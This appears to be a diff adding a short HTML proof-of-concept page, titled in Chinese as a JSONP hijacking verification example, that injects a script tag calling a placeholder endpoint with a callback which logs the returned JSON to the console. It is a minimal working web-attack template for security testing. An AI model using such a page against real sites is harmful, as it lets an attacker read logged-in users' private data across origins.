@@ -1,0 +1,23 @@
+<html>
+<head>
+	<title>jsonp劫持验证示例</title>
+	<meta charset="utf-8">
+	<style type="text/css">
+		table{
+			display: inline
+		}
+	</style>
+</head>
+ <body>
+	<script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
+	<script type="text/javascript">
+		function callbackFunction(json){ //与callback参数一致
+			console.log(json);
+		}
+		var s = document.createElement('script');
+		s.type = "text/javascript";
+		s.src = 'http://www.xxx.com/xxx.php?callback=callbackFunction';
+		document.body.appendChild(s);
+	</script>
+</body>
+</html>
